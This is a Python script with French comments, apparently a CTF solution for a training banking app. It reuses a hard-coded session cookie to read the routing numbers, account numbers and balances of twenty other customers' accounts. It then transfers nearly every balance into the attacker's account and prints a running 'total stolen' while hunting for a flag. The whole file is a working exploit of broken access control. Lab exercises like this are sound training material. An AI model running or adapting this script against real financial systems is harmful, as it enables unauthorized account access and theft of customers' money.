#!/usr/bin/env python3
"""
Script automatique pour Task 2 - R√©cup√®re les infos ET fait les transferts
"""
import requests
import time

BASE_URL = "http://web0x06.hbtn"
SESSION = "15qv66KhXbXeu1oAH91prTQxjcZACpV57yhb_HwfvLA.R-tQStxr52i60x3guGyJIw4p0BA"
MY_ACCOUNT = "4205e985b0a040dd8e9f97b16de2b3f3"  # Compte de yosri (nouveau)

# Liste des 20 nouveaux accounts (mise √† jour apr√®s reset)
accounts = [
    # Linda Robinson
    "10f2416b9735441da5dfba2ea7f67f87",
    "6e069c1640ae4d34b5ddb39219227d07",
    # Robert Martinez
    "6235fb53768844569f34de12691841ac",
    "3bd521f0f32f4b6dbdecabaf0ab424ec",
    # Patricia Garcia
    "9150364551264e5e9aa91f23afa6ac45",
    "575cec7273a84ec083b079c12821b13f",
    # James Thompson
    "c9e4e215668d4dd0890c7bd1da1542aa",
    "2f5715147c9c48ad890d979481a57e6e",
    # Elizabeth Martin
    "c640ad25c84543feb9a4a7dc6c7de7a2",
    "f14899a124034ba29fa1cb6ded4c2db4",
    # Brian Harris
    "d80476ce166a440d8e1bf7839ba852a1",
    "759a09337bdc4db6964e75d56c3a1f1f",
    # Megan White
    "639a9bb3137346d1a5de67c6f994b651",
    "030abd8efa7a4cb3b0522e55c06dcb41",
    # Mark Jackson
    "7087770b22bd48fc9fc0dd62c1f33c67",
    "991d7640e2d14cc894b080a4f0908b3b",
    # Ashley Thomas
    "df085024fdd24d1f8093b18d20f6530f",
    "2cea9ef9b46141ff9d4899c4b8c2098c",
    # David Anderson
    "ba517ef4ae394b9ebfc1227502562e4f",
    "b4eb32ac21e34edca774ed9210f4922e"
]

headers = {"Cookie": f"session={SESSION}"}
total_stolen = 0

print("üöÄ Exploitation automatique Task 2")
print("=" * 50)

for i, account_id in enumerate(accounts, 1):
    print(f"\n[{i}/20] Processing account: {account_id[:8]}...")
    
    # 1. R√©cup√©rer les infos du compte
    try:
        r = requests.get(f"{BASE_URL}/api/accounts/info/{account_id}", headers=headers)
        response = r.json()
        
        # Les donn√©es sont dans response["message"]
        account_info = response.get("message", {})
        
        routing = account_info.get("routing")
        number = account_info.get("number")
        balance = account_info.get("balance", 0)
        customer_id = account_info.get("customer_id", "Unknown")
        
        print(f"   Customer ID: {customer_id}")
        print(f"   Balance: ${balance}")
        
        if balance <= 0:
            print("   ‚è≠Ô∏è  Skipping (no money)")
            continue
        
        # 2. Calculer le montant √† voler (tout sauf $1 pour √©viter les erreurs)
        amount = int(balance - 1) if balance > 1 else int(balance)
        
        # 3. Faire le transfert
        transfer_data = {
            "amount": amount,
            "raison": "transfert",
            "account_id": account_id,
            "routing": routing,
            "number": number
        }
        
        r = requests.post(
            f"{BASE_URL}/api/accounts/transfer_to/{MY_ACCOUNT}",
            json=transfer_data,
            headers=headers
        )
        
        result = r.json()
        
        if result.get("status") == "success":
            total_stolen += amount
            print(f"   ‚úÖ Transferred ${amount}")
            print(f"   üí∞ Total accumulated: ${total_stolen}")
            
            # Chercher le flag dans la r√©ponse
            if "flag_2" in result:
                print(f"\nüéâ FLAG FOUND: {result['flag_2']}")
                with open("2-flag.txt", "w") as f:
                    f.write(result["flag_2"] + "\n")
        else:
            print(f"   ‚ùå Transfer failed: {result.get('message', 'Unknown error')}")
        
        time.sleep(0.5)  # Petit d√©lai pour √©viter rate limiting
        
    except Exception as e:
        print(f"   ‚ùå Error: {e}")
        continue

print("\n" + "=" * 50)
print(f"üéØ TOTAL STOLEN: ${total_stolen}")

# V√©rifier le solde final
print("\nüîç Checking final balance...")
r = requests.get(f"{BASE_URL}/api/customer/info/me", headers=headers)
user_info = r.json()

if "flag_2" in user_info:
    print(f"üéâ FLAG_2 FOUND: {user_info['flag_2']}")
    with open("2-flag.txt", "w") as f:
        f.write(user_info["flag_2"] + "\n")

print(f"üí∞ Final balance: ${user_info.get('total_balance', 'unknown')}")
print("\n‚úÖ Task 2 complete!")
